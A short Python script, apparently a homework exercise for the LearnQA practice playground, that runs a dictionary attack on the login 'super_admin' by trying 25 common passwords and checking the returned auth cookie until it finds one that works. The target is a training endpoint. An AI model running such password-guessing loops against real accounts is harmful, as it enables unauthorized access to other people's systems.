import requests

URL_GET_PASSWORD = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
URL_CHECK_COOKIE = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

LOGIN = "super_admin"

passwords = [
    "123456", "password", "123456789", "12345", "12345678",
    "qwerty", "111111", "1234567", "iloveyou", "adrian",
    "abc123", "dragon", "sunshine", "master", "hello",
    "princess", "monkey", "letmein", "mustang", "696969",
    "shadow", "michael", "asdf", "2000", "jordan"
]

print("Подбор пароля для логина:", LOGIN)

for password in passwords:
    print(f"Проверка пароля: {password}")

    response1 = requests.post(URL_GET_PASSWORD, data={
        "login": LOGIN,
        "password": password
    })

    auth_cookie = response1.cookies.get("auth_cookie")

    if not auth_cookie:
        print("Cookie не получена")
        continue

    cookies = {"auth_cookie": auth_cookie}
    response2 = requests.post(URL_CHECK_COOKIE, cookies=cookies)
    check_result = response2.text

    if "You are authorized" in check_result:
        print("Успешно")
        print(f"Логин: {LOGIN}")
        print(f"Пароль: {password}")
        print(f"Результат: {check_result}")
        print("="*50)
        break
    else:
        print(f"  Ошибка: {check_result} — неверный пароль")
        print("-" * 30)

else:
    print("Пароль не найден")